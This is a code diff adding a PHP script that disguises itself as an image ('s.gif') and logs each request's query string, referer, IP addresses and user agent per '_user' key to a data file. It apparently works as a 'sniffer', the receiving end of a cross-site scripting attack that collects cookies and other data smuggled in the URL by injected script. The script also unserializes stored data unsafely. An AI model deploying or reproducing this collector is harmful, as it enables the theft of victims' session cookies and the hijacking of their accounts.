@@ -1,0 +1,32 @@
+<?
+define("FILE", "s.gif");
+
+require "config.php";
+require "functions.php";
+
+$sniffed['user'] = strtolower($_GET['_user']);
+if (!$sniffed['user']) show_image();
+
+$user = $sniffed['user'];
+cleaner();
+
+$sniffed['date'] = date("d.m.Y H:i");
+$sniffed['ip'] = $_SERVER['REMOTE_ADDR'];
+$sniffed['referer'] = htmlspecialchars(stripslashes($_SERVER['HTTP_REFERER']));
+$sniffed['query'] = htmlspecialchars(stripslashes(urldecode($_SERVER['QUERY_STRING'])));
+$sniffed['agent'] = htmlspecialchars($_SERVER['HTTP_USER_AGENT']);
+$sniffed['real_ip'] = htmlspecialchars($_SERVER['HTTP_X_FORWARDED_FOR']);
+
+if (!preg_match("/^https?:\/\//i", $sniffed['referer'])) $sniffed['referer'] = "";
+if (preg_match("/(&amp;)?_user=[[:alnum:]]*(&amp;)?/", $sniffed['query'], $matches)) $sniffed['query'] = str_replace($matches[0], "", $sniffed['query']);
+
+$data = array();
+$data_content = get_file_content($data_filename);
+if ($data_content !== NULL) $data = unserialize($data_content);
+$entrie = serialize($sniffed);
+$data[] = $entrie;
+$data_content = serialize($data);
+put_file_content($data_filename, $data_content);
+
+show_image();
+?>
